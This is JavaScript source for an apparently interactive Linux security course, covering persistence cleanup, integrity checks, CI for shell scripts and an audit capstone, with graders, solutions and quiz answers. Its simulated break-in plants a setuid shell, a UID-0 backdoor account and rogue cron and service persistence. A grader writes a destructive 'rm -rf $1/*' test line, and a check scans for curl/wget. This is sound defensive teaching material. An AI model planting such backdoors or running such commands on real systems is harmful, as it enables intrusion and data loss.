      "sudo grep -vxFf ~/approved-keys.txt /home/deploy/.ssh/authorized_keys", "sudo sed -i '/sync@cloud-agent/d' /home/deploy/.ssh/authorized_keys",
      "sudo rm -r /usr/local/lib/.dbus", "sudo rm /home/deploy/.local/bin/sync-agent",
      "systemctl list-unit-files --state=enabled"),
    debrief: "<p>Four ways back in, all with innocent names: a cron job that would re-download the dropper every 10 minutes, an @reboot job, a service with <code>Restart=always</code> so killing the process wasn't enough, and two SSH keys, one of them for <b>root</b>. Each would have survived simply locking the deploy account.</p><p>That's why many teams rebuild a compromised server instead of cleaning it. Next: proving that the software you install is the software the vendor shipped.</p>",
    realworld: "Tools like chkrootkit and rkhunter, and EDR agents, look for exactly these patterns. auditd rules on /etc/cron.d, /etc/systemd/system and authorized_keys files alert you the moment something new appears.",
    quiz: [
      { q: "Why wasn't killing the miner process enough?", options: ["It was SUID", "systemd restarted it (Restart=always) and it started at boot", "It was a kernel thread", "It had a different PID"], answer: 1, why: "Disable and remove the unit, not just the process." },
      { q: "What does <code>grep -vxFf approved.txt authorized_keys</code> print?", options: ["The approved keys", "Keys in authorized_keys that aren't exactly an approved line", "Both files merged", "Nothing"], answer: 1, why: "-f patterns from a file, -F fixed strings, -x whole line, -v invert." },
      { q: "After deleting a unit file from /etc/systemd/system, you should...", options: ["reboot", "run systemctl daemon-reload", "run systemctl enable", "nothing"], answer: 1, why: "systemd keeps its loaded copy until you reload." }
    ]
  });

  /* ================================================================== LX-134 Integrity */
  var RELEASE_KEY = M4.makeKey("Kestrel Release Signing <release@kestrel.io>", "2026-01-15");
  var AGENT = "\x1f\x8b\x08\x00kestrel-agent 2.4.1 (official build)\n", AGENT_BAD = "\x1f\x8b\x08\x00kestrel-agent 2.4.1 (official build) + loader\n", CLI = "\x1f\x8b\x08\x00kestrel-cli 1.2.0\n";
  function sumsText(agent) { return M2.sha256(agent) + "  kestrel-agent-2.4.1.tar.gz\n" + M2.sha256(CLI) + "  kestrel-cli-1.2.0.tar.gz\n"; }
  function integrityScenario(sys) {
    var t = Date.UTC(2026, 10, 10, 14, 2, 11), D = "/home/dev/downloads";
    M2.mkdirRoot(sys, D + "/mirror", 509, 1000, 1000);
    M2.putRoot(sys, D + "/kestrel-agent-2.4.1.tar.gz", AGENT, 436, 1000, 1000);
    M2.putRoot(sys, D + "/kestrel-cli-1.2.0.tar.gz", CLI, 436, 1000, 1000);
    M2.putRoot(sys, D + "/SHA256SUMS", sumsText(AGENT), 436, 1000, 1000);
    M2.putRoot(sys, D + "/SHA256SUMS.asc", M4.sign(RELEASE_KEY, sumsText(AGENT), t), 436, 1000, 1000);
    M2.putRoot(sys, D + "/kestrel-release.asc", RELEASE_KEY.armor, 436, 1000, 1000);
    M2.putRoot(sys, D + "/mirror/kestrel-agent-2.4.1.tar.gz", AGENT_BAD, 436, 1000, 1000);
    M2.putRoot(sys, D + "/mirror/kestrel-cli-1.2.0.tar.gz", CLI, 436, 1000, 1000);
    M2.putRoot(sys, D + "/mirror/SHA256SUMS", sumsText(AGENT_BAD), 436, 1000, 1000);
    M2.putRoot(sys, D + "/mirror/SHA256SUMS.asc", M4.sign(RELEASE_KEY, sumsText(AGENT), t), 436, 1000, 1000);
    var sshd = M2.nodeAt(sys, "/usr/sbin/sshd"); sshd.content = sshd.content + "#kc-pam-hook\n"; sshd.mtime = Date.UTC(2026, 10, 11, 3, 18, 0);
  }
  var FPR_SPACED = RELEASE_KEY.fpr.replace(/(.{4})/g, "$1 ").trim().replace(/^((?:\S{4} ){4}\S{4}) /, "$1  ");
  LABS.push({
    id: "lx-134", n: 34, module: 4, ticket: "LX-134", xp: 160,
    title: "Integrity",
    topic: "sha256sum, GPG signatures, package checks",
    from: DEV,
    story: "<p>Two questions after an incident: is the software we're about to install genuine, and are the programs already installed still the ones Ubuntu shipped? You downloaded the new Kestrel agent twice, from the official site (<code>~/downloads</code>) and from a faster mirror (<code>~/downloads/mirror</code>). Check both. The release key's fingerprint, as published on kestrel.io:</p><pre class=\"code\">" + FPR_SPACED + "</pre>",
    learn:
      "<h3>Checksums: is the file intact?</h3>" + code("sha256sum file.tar.gz\nsha256sum -c SHA256SUMS") +
      "<p>A SHA-256 checksum changes completely if one byte of the file changes. Releases ship a <code>SHA256SUMS</code> file; <code>sha256sum -c</code> checks every file it lists and prints <code>OK</code> or <code>FAILED</code>.</p>" +
      '<div class="callout">A checksum from the <b>same place</b> as the file proves nothing about who made it: whoever can swap the file can swap the checksum too.</div>' +
      "<h3>Signatures: who made it?</h3><p>The vendor signs <code>SHA256SUMS</code> with their private key, producing <code>SHA256SUMS.asc</code>. Anyone with the matching <b>public</b> key can check it. First make sure the key is really theirs: compare its fingerprint with one published somewhere you trust (their website over HTTPS, documentation).</p>" +
      code("gpg --show-keys kestrel-release.asc        # look before importing\ngpg --import kestrel-release.asc\ngpg --verify SHA256SUMS.asc SHA256SUMS") +
      "<p>gpg prints its verdict on <b>stderr</b>: <code>Good signature</code> (exit 0), <code>BAD signature</code> (exit 1: the file was changed after signing), or <code>No public key</code>. The \"not certified with a trusted signature\" warning just means you haven't formally certified the key; your fingerprint check is what establishes trust.</p>" +
      "<h3>Installed packages</h3><p>dpkg recorded a checksum of every file each package installed. Compare the disk with that record:</p>" +
      code("sudo dpkg --verify            # silent when all is well; ??5?????? = checksum changed\nsudo apt install -y debsums && sudo debsums -s") +
      "<p>A changed system binary (<code>sshd</code>, <code>ls</code>, <code>ps</code>...) after a break-in usually means a rootkit or backdoor. Put the genuine file back by reinstalling the package: <code>sudo apt install --reinstall PACKAGE</code> (<code>dpkg -S FILE</code> tells you which package owns a file).</p>",
    files: {},
    system: integrityScenario,
    starter: "",
    objectives: [
      {
        id: "sums", text: "Check the checksums in <b>both</b> download folders with <code>sha256sum -c</code>.",
        hints: ["Run it inside each folder (the file names in SHA256SUMS are relative).", "cd ~/downloads && sha256sum -c SHA256SUMS\ncd ~/downloads/mirror && sha256sum -c SHA256SUMS"],
        check: function (r) {
          var a = r.history.some(function (e) { return /sha256sum\s+(-c|--check)/.test(e.cmd) && e.cwdBefore === HOME + "/downloads" && outHas(e, /^kestrel-agent-2\.4\.1\.tar\.gz: OK$/); });
          var b = r.history.some(function (e) { return /sha256sum\s+(-c|--check)/.test(e.cmd) && (e.cwdBefore === HOME + "/downloads/mirror" || /mirror/.test(e.cmd)) && outHas(e, /kestrel-agent-2\.4\.1\.tar\.gz: OK$/); });
          return a && b ? true : !a ? "Run sha256sum -c SHA256SUMS inside ~/downloads." : "Now inside ~/downloads/mirror too. (Look closely at the result.)";
        }
      },
      {
        id: "key", text: "Before trusting the release key, show its fingerprint and compare it with the published one above, then import it.",
        hints: ["gpg --show-keys reads a key file without importing it; --fingerprint lists imported keys spaced like the published one.", "gpg --show-keys ~/downloads/kestrel-release.asc\ngpg --import ~/downloads/kestrel-release.asc\ngpg --fingerprint"],
        check: function (r) {
          var shown = ran(r, /gpg\b.*(--show-keys|--fingerprint|--list-keys|-k\b)/, function (e) { return outHas(e, new RegExp(RELEASE_KEY.fpr + "|" + FPR_SPACED.replace(/ /g, "\\s+"))); });
          var ring = r.read(HOME + "/.gnupg/pubring.kbx") || "";
          if (ring.indexOf(RELEASE_KEY.fpr) < 0) return "Import the key: gpg --import ~/downloads/kestrel-release.asc";
          return shown ? true : "Show the key's fingerprint (gpg --show-keys FILE before importing, or gpg --fingerprint after) and compare it with the published one.";
        }
      },
      {
        id: "verify", text: "Verify the signature of <code>SHA256SUMS</code> in both folders. Which download can you trust?",
        hints: ["gpg --verify SIGNATURE FILE, once per folder.", "gpg --verify ~/downloads/SHA256SUMS.asc ~/downloads/SHA256SUMS\ngpg --verify ~/downloads/mirror/SHA256SUMS.asc ~/downloads/mirror/SHA256SUMS"],
        check: function (r) {
          var good = ran(r, /gpg\s+--verify/, function (e) { return !/mirror/.test(e.cmd) && e.cwdBefore !== HOME + "/downloads/mirror" && outHas(e, /Good signature from "Kestrel Release Signing/); });
          var bad = ran(r, /gpg\s+--verify/, function (e) { return (/mirror/.test(e.cmd) || e.cwdBefore === HOME + "/downloads/mirror") && outHas(e, /BAD signature/); });
          return good && bad ? true : !good ? "Verify the official SHA256SUMS: it should be a Good signature." : "Now the mirror's: its SHA256SUMS was changed after signing.";
        }
      },
      {
        id: "pkgs", text: "Check the installed packages' files against dpkg's records: one system binary has been modified.",
        hints: ["dpkg --verify (needs sudo) prints only files that differ.", "sudo dpkg --verify"],
        check: function (r) { return ran(r, /dpkg\s+(-V|--verify)|debsums/, function (e) { return outHas(e, /\/usr\/sbin\/sshd/); }) ? true : "sudo dpkg --verify (or install debsums and run sudo debsums -s) should point at the modified file."; }
      },
      {
        id: "reinstall", text: "Restore the genuine file by reinstalling its package, then verify again: nothing should be reported.",
        hints: ["dpkg -S /usr/sbin/sshd names the package.", "dpkg -S /usr/sbin/sshd\nsudo apt install --reinstall openssh-server\nsudo dpkg --verify"],
        check: function (r) {
          if (M4.changedFiles(r.sys).length) return "/usr/sbin/sshd is still the modified one: sudo apt install --reinstall openssh-server";
          var k = idxOf(r, /reinstall/);
          return r.history.some(function (e, i) { return i > k && /dpkg\s+(-V|--verify)|debsums/.test(e.cmd) && !outHas(e, /sshd/); }) ? true : "Verify again after reinstalling (sudo dpkg --verify prints nothing when all is well).";
        }
      }
    ],
    solution: sol("cd ~/downloads", "sha256sum -c SHA256SUMS", "cd ~/downloads/mirror", "sha256sum -c SHA256SUMS", "cd ~",
      "gpg --show-keys ~/downloads/kestrel-release.asc", "gpg --import ~/downloads/kestrel-release.asc", "gpg --fingerprint",
      "gpg --verify ~/downloads/SHA256SUMS.asc ~/downloads/SHA256SUMS", "gpg --verify ~/downloads/mirror/SHA256SUMS.asc ~/downloads/mirror/SHA256SUMS",
      "sudo dpkg --verify", "dpkg -S /usr/sbin/sshd", "sudo apt install --reinstall openssh-server", "sudo dpkg --verify"),
    debrief: "<p>The mirror passed <code>sha256sum -c</code>, because whoever modified the agent also rewrote SHA256SUMS to match. Only the signature caught it: they couldn't re-sign without Kestrel's private key. That's the whole point of signing.</p><p>And the installed <code>sshd</code> had been changed during the break-in (a hook to capture passwords, judging by the name). Reinstalling the package put back the genuine binary. One ticket left before the capstone: making scripts like yours safe to change, with checks that run automatically.</p>",
    realworld: "Ubuntu ISOs, Debian packages (apt checks signatures on every update), Docker images (cosign), and Git commits (signed commits) all use the same idea: a checksum for integrity, a signature for who made it.",
    quiz: [
      { q: "The mirror's tarball passed <code>sha256sum -c</code>. Why isn't that enough?", options: ["sha256 is broken", "Whoever changed the file could change SHA256SUMS too", "-c only checks names", "Mirrors can't be checked"], answer: 1, why: "Checksums from the same source prove integrity, not origin." },
      { q: "<code>gpg --verify</code> says <i>BAD signature</i>. That means...", options: ["The key expired", "The signed file was changed after signing", "You don't have the key", "The signature is from someone else"], answer: 1, why: "Missing key gives 'No public key'; a mismatch gives BAD." },
      { q: "How do you know a public key really belongs to the vendor?", options: ["gpg says Good signature", "Its fingerprint matches one published somewhere you trust", "It's in the same folder", "It has their email"], answer: 1, why: "Anyone can make a key with any name and email. The fingerprint is what you compare." }
    ]
  });

  /* ================================================================== LX-135 Bash in CI */
  var OPS = "/home/dev/kestrel-ops";
  var DEPLOY_SH = sc("#!/bin/bash", "# Deploy a release: deploy.sh VERSION", "set -euo pipefail", "version=$1", "release_dir=/var/www/kestrel/releases/$version", "echo \"Deploying $version\"", "mkdir -p $release_dir", "cd $release_dir", "for f in $(ls /tmp/build); do", "  cp /tmp/build/$f .", "done", "ln -sfn $release_dir /var/www/kestrel/current", "echo \"Done: `date +%T`\"");
  var BACKUP_SH = sc("#!/bin/bash", "# Back up the site: backup.sh DEST", "set -euo pipefail", "dest=${1:?usage: backup.sh DEST}", "mkdir -p \"$dest\"", "tar czf \"$dest/site-$(date +%F).tar.gz\" -C /var/www kestrel", "echo \"Backup written to $dest\"");
  var CHECK_SH = sc("#!/bin/bash", "# Is nginx up? check.sh", "set -euo pipefail", "if systemctl is-active --quiet nginx; then", "  echo \"nginx up\"", "else", "  echo \"nginx down\" >&2", "  exit 1", "fi");
  function ciScenario(sys) { M3.preinstall(sys, "shellcheck"); }
  var CI_FILES = {};
  CI_FILES["kestrel-ops/scripts/deploy.sh"] = { content: DEPLOY_SH, mode: 493 };
  CI_FILES["kestrel-ops/scripts/backup.sh"] = { content: BACKUP_SH, mode: 493 };
  CI_FILES["kestrel-ops/scripts/check.sh"] = { content: CHECK_SH, mode: 493 };
  CI_FILES["kestrel-ops/README.md"] = "# kestrel-ops\nOperations scripts for the Kestrel web servers. Every script must pass ShellCheck.\n";
  LABS.push({
    id: "lx-135", n: 35, module: 4, ticket: "LX-135", xp: 160,
    title: "Bash in CI",
    topic: "ShellCheck, exit codes, GitHub Actions",
    from: MAYA,
    story: "<p>The team's operations scripts live in <code>~/kestrel-ops</code> (a Git repository on GitHub). After this month you want <b>every</b> change to them checked automatically before it's merged: syntax, ShellCheck, all of it. Clean up the scripts, write the check script, and the GitHub Actions workflow that runs it.</p>",
    learn:
      "<h3>The check script is the contract</h3><p>CI runs a command and looks at one thing: its <b>exit code</b>. 0 = green, anything else = red, merge blocked. So write a script that runs every check and fails if any of them fails:</p>" +
      code(sc("#!/bin/bash", "set -euo pipefail", "cd \"$(dirname \"$0\")/..\"        # run from the repository root, wherever it's called from", "for f in scripts/*.sh; do", "  bash -n \"$f\"                  # syntax only", "done", "shellcheck scripts/*.sh", "echo \"All checks passed\"")) +
      "<p>With <code>set -e</code>, the first failing check stops the script with a non-zero code, which fails the build. Run the same script on your machine before pushing: CI should never surprise you.</p>" +
      "<h3>GitHub Actions</h3><p>A workflow is a YAML file in <code>.github/workflows/</code>. This one runs on every push and pull request (ShellCheck is pre-installed on GitHub's Ubuntu runners):</p>" +
      code(sc("name: shell-checks", "on: [push, pull_request]", "jobs:", "  lint:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: actions/checkout@v4", "      - run: ./ci/check.sh")) +
      "<p>YAML is picky: spaces only (no tabs), and indentation is the structure. The Git track's Module 3 goes much further with Actions.</p>" +
      '<div class="callout">Make the CI script executable (<code>chmod +x</code>) and commit it like that: Git keeps the x bit, and <code>./ci/check.sh</code> fails with Permission denied otherwise.</div>',
    files: CI_FILES,
    system: ciScenario,
    starter: "",
    objectives: [
      {
        id: "lint", text: "Run ShellCheck on all the scripts, then fix <code>scripts/deploy.sh</code> until every script passes with no findings (keep what it does the same).",
        hints: ["shellcheck scripts/*.sh from inside ~/kestrel-ops. deploy.sh needs quotes, a checked cd, a glob instead of $(ls), and $( ) instead of backticks.", "mkdir -p \"$release_dir\"\ncd \"$release_dir\" || exit 1\nfor f in /tmp/build/*; do\n  cp \"$f\" .\ndone\nln -sfn \"$release_dir\" /var/www/kestrel/current\necho \"Done: $(date +%T)\""],
        check: function (r) {
          if (!ran(r, /\bshellcheck\b/, function (e) { return outHas(e, /deploy\.sh/); })) return "Run shellcheck on the scripts first (cd ~/kestrel-ops; shellcheck scripts/*.sh).";
          var bad = ["deploy.sh", "backup.sh", "check.sh"].map(function (n) { return [n, M3.lint(r.read(OPS + "/scripts/" + n) || "")]; }).filter(function (x) { return x[1].length; });
          if (bad.length) return "ShellCheck still finds " + bad[0][1][0].code + " in " + bad[0][0] + " line " + bad[0][1][0].line + ": " + bad[0][1][0].message;
          var t = r.read(OPS + "/scripts/deploy.sh") || "";
          return /ln -sfn/.test(t) && /mkdir -p/.test(t) && /\bcp\b/.test(t) ? true : "deploy.sh should still create the release folder, copy the build and switch the current symlink.";
        }
      },
      {
        id: "ci", text: "Write <code>ci/check.sh</code>: with <code>set -euo pipefail</code>, it checks the syntax of every <code>scripts/*.sh</code> with <code>bash -n</code>, runs ShellCheck on them, and prints <code>All checks passed</code> at the end. It must work from any directory and <b>fail</b> (non-zero) if any check fails.",
        hints: ["cd \"$(dirname \"$0\")/..\" moves to the repository root. Don't forget chmod +x.", "#!/bin/bash\nset -euo pipefail\ncd \"$(dirname \"$0\")/..\"\nfor f in scripts/*.sh; do\n  bash -n \"$f\"\ndone\nshellcheck scripts/*.sh\necho \"All checks passed\""],
        check: function (r) {
          var b = basics(r, "~/kestrel-ops/ci/check.sh"); if (b) return b;
          var ok = call(r, "cd / && " + OPS + "/ci/check.sh");
          if (ok.exit !== 0 || ok.out[ok.out.length - 1] !== "All checks passed") return "Run from /, ci/check.sh should end with All checks passed and exit 0 (got " + show(ok.out.slice(-2)) + ", exit " + ok.exit + (ok.err.length ? ", error " + show(ok.err[0]) : "") + ").";
          var syn = call(r, "printf 'if true; then\\n  echo x\\n' > " + OPS + "/scripts/broken.sh; cd " + OPS + " && ./ci/check.sh");
          if (syn.exit === 0 || syn.out.indexOf("All checks passed") >= 0) return "With a script that has a syntax error, ci/check.sh still passed.";
          var lint = call(r, "printf '#!/bin/bash\\nrm -rf $1/*\\n' > " + OPS + "/scripts/risky.sh; cd " + OPS + " && ./ci/check.sh");
          if (lint.exit === 0 || lint.out.indexOf("All checks passed") >= 0) return "With a script ShellCheck complains about, ci/check.sh still passed.";
          var t = r.read(OPS + "/ci/check.sh");
          return /set\s+-euo\s+pipefail/.test(t) && /bash\s+-n/.test(t) ? true : "Use set -euo pipefail and bash -n in the script.";
        }
      },
      {
        id: "workflow", text: "Write <code>.github/workflows/ci.yml</code>: on <b>push</b> and <b>pull_request</b>, a job on <code>ubuntu-latest</code> that checks out the code (<code>actions/checkout@v4</code>) and runs <code>./ci/check.sh</code>.",
        hints: ["mkdir -p ~/kestrel-ops/.github/workflows, then nano the file. Indent with spaces.", "name: shell-checks\non: [push, pull_request]\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: ./ci/check.sh"],
        check: function (r) {
          var t = r.read(OPS + "/.github/workflows/ci.yml");
          if (t === null) { var alt = r.read(OPS + "/.github/workflows/ci.yaml"); if (alt === null) return "Create ~/kestrel-ops/.github/workflows/ci.yml"; t = alt; }
          if (/\t/.test(t)) return "YAML doesn't allow tabs: indent with spaces.";
          if (!/^on:/m.test(t) || !/\bpush\b/.test(t) || !/\bpull_request\b/.test(t)) return "Trigger it on push and pull_request (on: [push, pull_request]).";
          if (!/^jobs:\s*$/m.test(t)) return "The file needs a jobs: section.";
          if (!/runs-on:\s*ubuntu-latest/.test(t)) return "The job should run on ubuntu-latest.";
          if (!/-\s*uses:\s*actions\/checkout@v4/.test(t)) return "First step: - uses: actions/checkout@v4 (without it the runner has no code).";
          return /-\s*run:\s*(\.\/ci\/check\.sh|bash\s+ci\/check\.sh)\s*$/m.test(t) ? true : "Last step: - run: ./ci/check.sh";
        }
      }
    ],
    solution: sol("cd ~/kestrel-ops", "shellcheck scripts/*.sh",
      { nano: "scripts/deploy.sh", text: sc("#!/bin/bash", "# Deploy a release: deploy.sh VERSION", "set -euo pipefail", "version=$1", "release_dir=/var/www/kestrel/releases/$version", "echo \"Deploying $version\"", "mkdir -p \"$release_dir\"", "cd \"$release_dir\" || exit 1", "for f in /tmp/build/*; do", "  cp \"$f\" .", "done", "ln -sfn \"$release_dir\" /var/www/kestrel/current", "echo \"Done: $(date +%T)\"") },
      "shellcheck scripts/*.sh", "mkdir -p ci",
      { nano: "ci/check.sh", text: sc("#!/bin/bash", "# Every check CI runs. Exit code 0 = all good.", "set -euo pipefail", "cd \"$(dirname \"$0\")/..\"", "for f in scripts/*.sh; do", "  bash -n \"$f\"", "done", "shellcheck scripts/*.sh", "echo \"All checks passed\"") },
      "chmod +x ci/check.sh", "./ci/check.sh", "mkdir -p .github/workflows",
      { nano: ".github/workflows/ci.yml", text: sc("name: shell-checks", "on: [push, pull_request]", "jobs:", "  lint:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: actions/checkout@v4", "      - run: ./ci/check.sh") },
      "cat .github/workflows/ci.yml"),
    debrief: "<p>Now a change that breaks a script, or introduces an unquoted variable, turns the pull request red before anyone can merge it. The pieces are deliberately boring: a script whose exit code means pass or fail, the same script on your laptop and in CI, and a few lines of YAML.</p><p>That's the DevSecOps idea in miniature: security checks that run automatically on every change, instead of a review someone has to remember. Last ticket: the audit capstone.</p>",
    realworld: "Add a pre-commit hook (the pre-commit framework has a shellcheck hook) so the same check runs before you even commit. The Git track's Module 4 covers hooks and gitleaks for secrets.",
    quiz: [
      { q: "How does CI decide whether a step passed?", options: ["It reads the output for 'error'", "The command's exit code: 0 passes", "It asks the author", "By the run time"], answer: 1, why: "Non-zero exit = failed step = red build." },
      { q: "Why does ci/check.sh start with <code>cd \"$(dirname \"$0\")/..\"</code>?", options: ["To be faster", "So it finds scripts/ whatever directory it's run from", "GitHub requires it", "To leave the repository"], answer: 1, why: "$0 is the script's own path; its folder's parent is the repository root." },
      { q: "In the workflow, what does <code>actions/checkout@v4</code> do?", options: ["Installs ShellCheck", "Puts the repository's code on the runner", "Checks out a branch locally", "Approves the pull request"], answer: 1, why: "A runner starts empty: checkout clones your code into it." }
    ]
  });

  /* ================================================================== LX-136 Capstone: audit and harden */
  function auditScenario(sys) {
    breakin({ fails: { "203.0.113.50": 58, "198.51.100.77": 9 } })(sys);
    M2.removeProc(sys, M2.procByPid(sys, 3311)); M2.removeProc(sys, M2.procByPid(sys, 3340));
    sys.wtmp.forEach(function (e) { if (e.user === "deploy" && e.end === null) e.end = Date.UTC(2026, 10, 11, 3, 58, 0); });
    accountsScenario({ backdoor: "sysupdate", empty: "qa-test", contractor: "contractor-li", extraSudo: "ben" })(sys);
    M2.rmRoot(sys, "/etc/sudoers.d/91-contractor-li");
    M2.mkdirRoot(sys, "/var/tmp/.font-unix", 1023, 0, 0);
    M2.putRoot(sys, "/var/tmp/.font-unix/.x", BASH_BIN, 2541, 0, 0, NOW - DAY);
    M2.mkdirRoot(sys, "/etc/kestrel", 493);
    M2.putRoot(sys, "/etc/kestrel/app.env", "DB_HOST=10.0.1.30\nDB_USER=kestrel\nDB_PASSWORD=" + "kc_" + "db_" + "2026" + "\n", 438, 0, 33);
    persistScenario({ svc: "kestrel-sync", cron: "logrotate-extra" })(sys);
    var c = M2.rd(sys, "/etc/ssh/sshd_config").replace(/^#?PermitRootLogin .*$/m, "PermitRootLogin yes");
    if (!/^PermitRootLogin yes/m.test(c)) c = c.replace(/^Port 22$/m, "Port 22\nPermitRootLogin yes");
    M2.writeRoot(sys, "/etc/ssh/sshd_config", c);
    M2.mkdirRoot(sys, "/etc/ssh/sshd_config.d");
    M2.putRoot(sys, "/etc/ssh/sshd_config.d/50-cloud-init.conf", "PasswordAuthentication yes\n", 384);
    sys.sshdLive = M2.sshdConf(sys);
  }
  LABS.push({
    id: "lx-136", n: 36, module: 4, ticket: "LX-136", xp: 300, capstone: true,
    title: "Audit and harden kc-web-01",
    topic: "Module 4 capstone",
    from: DEV,
    story: "<p>A second server, same attacker, same night. This time nobody tells you what they did: find it all, fix it, and write it up. When you're done, kc-web-01 must meet this baseline:</p>" +
      '<table class="t"><tr><th>Area</th><th>Baseline</th></tr>' +
      "<tr><td>Accounts</td><td>only root has UID 0 · no account with an empty password · only dev and ana in the sudo group</td></tr>" +
      "<tr><td>Files</td><td>no SUID file outside the stock Ubuntu set · nothing world-writable under /etc, /opt or /var/www</td></tr>" +
      "<tr><td>Persistence</td><td>no attacker cron job · no attacker service (stopped, disabled, unit file deleted) · only approved SSH keys (<code>~/approved-keys.txt</code>)</td></tr>" +
      "<tr><td>SSH</td><td>no root login, no passwords (effective config), and the running sshd uses it</td></tr>" +
      "<tr><td>Firewall</td><td>on, default deny incoming, 22, 80 and 443 open, the attacker's address blocked before anything else, and you still connected</td></tr>" +
      "<tr><td>Report</td><td><code>~/audit-report.txt</code> names the attacker's IP, the backdoor account, the rogue service and the planted SUID file</td></tr></table>",
    learn: "<p>Everything from Module 4, in the order you'd do it for real: <b>investigate</b> (auth.log, last), <b>contain</b> (firewall the attacker, lock what they used), <b>eradicate</b> (accounts, SUID files, cron, services, keys), <b>harden</b> (SSH, permissions), <b>document</b>. Collect findings in the report as you go: <code>echo \"...\" &gt;&gt; ~/audit-report.txt</code>.</p>" +
      '<div class="callout">Take notes before you delete anything: the report needs the names of what you removed.</div>',
    files: {},
    system: auditScenario,
    starter: "",
    objectives: [
      {
        id: "accounts", hints: [], text: "Accounts meet the baseline.",
        check: function (r) {
          var z = uid0(r); if (!same(z, ["root"])) return "UID 0 accounts: " + z.join(", ") + ".";
          var e = emptyPw(r); if (e.length) return "Accounts with no password: " + e.join(", ") + ".";
          var g = groupMembers(r, "sudo"); return same(g, ["ana", "dev"]) ? true : "sudo group members: " + g.join(", ") + ".";
        }
      },
      {
        id: "files", hints: [], text: "Files meet the baseline.",
        check: function (r) {
          var stock = ["/usr/bin/chfn", "/usr/bin/chsh", "/usr/bin/gpasswd", "/usr/bin/mount", "/usr/bin/newgrp", "/usr/bin/passwd", "/usr/bin/pkexec", "/usr/bin/su", "/usr/bin/sudo", "/usr/bin/umount", "/usr/bin/fusermount3"];
          var extra = suidList(r).filter(function (p) { return stock.indexOf(p) < 0; });
          if (extra.length) return "Unexpected SUID files: " + extra.join(", ") + ".";
          var w = worldW(r); return w.length ? "World-writable: " + w.join(", ") + "." : true;
        }
      },
      {
        id: "persist", hints: [], text: "No persistence left.",
        check: function (r) {
          var cron = (r.list("/etc/cron.d") || []).filter(function (n) { return /curl|wget/.test(r.read("/etc/cron.d/" + n) || ""); });
          if (cron.length) return "A cron job still downloads and runs code: /etc/cron.d/" + cron[0] + ".";
          if (/sync-agent/.test(r.read("/var/spool/cron/crontabs/deploy") || "")) return "deploy's crontab still runs sync-agent.";
          if (unitActive(r, "kestrel-sync.service") || procs(r, /kestrel-sync/).length || r.exists("/etc/systemd/system/kestrel-sync.service") || M2.nodeAt(r.sys, "/etc/systemd/system/multi-user.target.wants/kestrel-sync.service", true)) return "The rogue service is still running, enabled or installed.";
          var a = keyLines(r, "/root/.ssh/authorized_keys"), b = keyLines(r, "/home/deploy/.ssh/authorized_keys");
          return same(a, [LEGIT_ROOT_KEY]) && same(b, [LEGIT_DEPLOY_KEY]) ? true : "authorized_keys files should hold only the approved keys.";
        }
      },
      {
        id: "ssh", hints: [], text: "SSH meets the baseline.",
        check: function (r) {
          var c = sshdEff(r); if (c.errors.length) return "sshd config has errors: " + c.errors[0];
          if (c.permitrootlogin !== "no" || c.passwordauthentication !== "no") return "The effective SSH config still allows root login or passwords.";
          var live = r.sys.sshdLive || {}; return live.permitrootlogin === "no" && live.passwordauthentication === "no" ? true : "The running sshd hasn't loaded the new config.";
        }
      },
      {
        id: "firewall", hints: [], text: "The firewall meets the baseline.",
        check: function (r) {
          if (r.sys.lockedOut) return "You're locked out.";
          var f = M4.fw(r.sys); if (!f.enabled || f.def.incoming !== "deny") return "The firewall should be on with default deny incoming.";
          if (!M4.allows(r.sys, 22, "tcp", "198.51.100.20") || !M4.allows(r.sys, 80, "tcp", "198.51.100.9") || !M4.allows(r.sys, 443, "tcp", "198.51.100.9")) return "22, 80 and 443 should be open.";
          if (M4.allows(r.sys, 22, "tcp", ATTACKER) || M4.allows(r.sys, 443, "tcp", ATTACKER)) return "The attacker can still reach the server.";
          return M4.allows(r.sys, 5432, "tcp", "198.51.100.9") || M4.allows(r.sys, 8080, "tcp", "198.51.100.9") ? "Only 22, 80 and 443 should be open to everyone." : true;
        }
      },
      {
        id: "report", hints: [], text: "<code>~/audit-report.txt</code> names the attacker's IP, the backdoor account, the rogue service and the planted SUID file.",
        check: function (r) {
          var t = r.read(HOME + "/audit-report.txt");
          if (t === null) return "Write ~/audit-report.txt.";
          var miss = [["203.0.113.50", "the attacker's IP"], ["sysupdate", "the backdoor account"], ["kestrel-sync", "the rogue service"], ["/var/tmp/.font-unix/.x", "the SUID file"]].filter(function (x) { return t.indexOf(x[0]) < 0; });
          return miss.length ? "The report doesn't mention " + miss.map(function (x) { return x[1]; }).join(", ") + "." : true;
        }
      }
    ],
    solution: sol("grep 'Failed password' /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn", "grep Accepted /var/log/auth.log",
      "echo 'Attacker: 203.0.113.50 (SSH brute force, got into deploy)' > ~/audit-report.txt",
      "sudo ufw default deny incoming", "sudo ufw allow OpenSSH", "sudo ufw allow 'Nginx Full'", "sudo ufw enable", "sudo ufw insert 1 deny from 203.0.113.50",
      "sudo passwd -l deploy", "sudo usermod -e 1 deploy",
      "awk -F: '$3 == 0 {print $1}' /etc/passwd", "echo 'Backdoor account: sysupdate (UID 0), deleted' >> ~/audit-report.txt", "sudo userdel -r -f sysupdate",
      "sudo awk -F: '$2 == \"\" {print $1}' /etc/shadow", "sudo passwd -l qa-test", "getent group sudo", "sudo gpasswd -d ben sudo",
      "sudo find / -perm -4000 -type f 2>/dev/null", "echo 'SUID shell: /var/tmp/.font-unix/.x, deleted' >> ~/audit-report.txt", "sudo rm /var/tmp/.font-unix/.x",
      "sudo find /etc /opt /var/www -type f -perm -o+w", "sudo chmod 640 /etc/kestrel/app.env",
      "ls -l /etc/cron.d", "sudo rm /etc/cron.d/logrotate-extra", "sudo crontab -l -u deploy | grep -v sync-agent | sudo crontab -u deploy -",
      "systemctl list-unit-files --state=enabled", "echo 'Rogue service: kestrel-sync (runs /usr/local/lib/.kestrel/kestrel-sync), removed' >> ~/audit-report.txt",
      "sudo systemctl disable --now kestrel-sync", "sudo rm /etc/systemd/system/kestrel-sync.service", "sudo systemctl daemon-reload",
      "sudo sed -i '/backup@kc-backup-01/d' /root/.ssh/authorized_keys", "sudo sed -i '/sync@cloud-agent/d' /home/deploy/.ssh/authorized_keys",
